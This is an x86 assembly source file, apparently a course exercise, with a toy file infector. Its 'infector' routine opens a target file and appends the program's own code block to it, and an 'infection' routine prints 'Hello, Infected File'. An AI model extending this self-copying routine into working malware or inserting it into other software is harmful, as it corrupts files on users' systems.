section		.data
	handle: dd 0

section		.text
	msg: db 'Hello, Infected File', 0xA	;message to print
	len: equ $ - msg		;len of string msg (in this case should be 21)
	


global _start
global system_call
global infection
global infector
extern main

_start:
    pop    dword ecx    ; ecx = argc
    mov    esi,esp      ; esi = argv
    ;; lea eax, [esi+4*ecx+4] ; eax = envp = (4*ecx)+esi+4
    mov     eax,ecx     ; put the number of arguments into eax
    shl     eax,2       ; compute the size of argv in bytes
    add     eax,esi     ; add the size to the address of argv 
    add     eax,4       ; skip NULL at the end of argv
    push    dword eax   ; char *envp[]
    push    dword esi   ; char* argv[]
    push    dword ecx   ; int argc

    call    main        ; int main( int argc, char *argv[], char *envp[] )

    mov     ebx,eax
    mov     eax,1
    int     0x80
    nop


code_start:


infection:
	push	ebp		; Save caller state
	mov 	ebp, esp	; set ebp to infection activation frame
	pushad                  ; Save some more caller state
	mov	eax, [ebp+8]	; get first(and only) argument
	and	eax, 1		; check for condition -> save at eax
	cmp	eax, 0
	jnz	end		; argument is odd

	mov	eax, 4		; system call number (sys_write)
	mov	ebx, 1		; file descriptor (stdout)
	mov	ecx, msg	; message to write
	mov 	edx, len	; message length
	int	0x80		; call kernel

	popad			; restore flags register
	pop	ebp
	ret			; return


end:
	popad
	pop	ebp
	ret




infector:
	push	ebp		; Save caller state
	mov 	ebp, esp	; set ebp to infection activation frame
	pushad                  ; Save some more caller state
	mov	edx, [ebp+8]	; get first(and only) argument -> edx

	mov	eax, 5		; system call number (sys_open)
	mov	ebx, edx	; set file_name - located at edx as it gets it as argument
	mov	ecx, 0x002	; set file access bits - READ & WRITE only
	mov	edx, 0x200	; set file permmission
	int	0x80		; call kernel
	mov	[handle], eax	; move file handle to memory
	
	mov	eax,19		; system call number (sys_seek)
	mov	ebx,[handle]	; move file handle from memory
	mov	ecx,0		; offset
	mov	edx,2		; start flag
	int	0x80		; call kernel

	mov	eax, 4				; system call number (sys_write)
	mov	ebx, [handle]			; move file handle to memory
	mov	ecx, code_start			; message to write
	mov 	edx, code_end- code_start	; message length
	int	0x80				; call kernel

	mov	eax, 6				; system call number (sys_close)
	mov	ebx, [handle]			; move file handle to memory
	int	0x80				; call kernel
	
	popad					; restore flags register
	pop	ebp
	ret		
        
	
code_end:

	
	
system_call:
    push    ebp             ; Save caller state
    mov     ebp, esp
    sub     esp, 4          ; Leave space for local var on stack
    pushad                  ; Save some more caller state

    mov     eax, [ebp+8]    ; Copy function args to registers: leftmost...        
    mov     ebx, [ebp+12]   ; Next argument...
    mov     ecx, [ebp+16]   ; Next argument...
    mov     edx, [ebp+20]   ; Next argument...
    int     0x80            ; Transfer control to operating system
    mov     [ebp-4], eax    ; Save returned value...
    popad                   ; Restore caller state (registers)
    mov     eax, [ebp-4]    ; place returned value where caller can see it
    add     esp, 4          ; Restore caller state
    pop     ebp             ; Restore caller state
    ret                     ; Back to caller
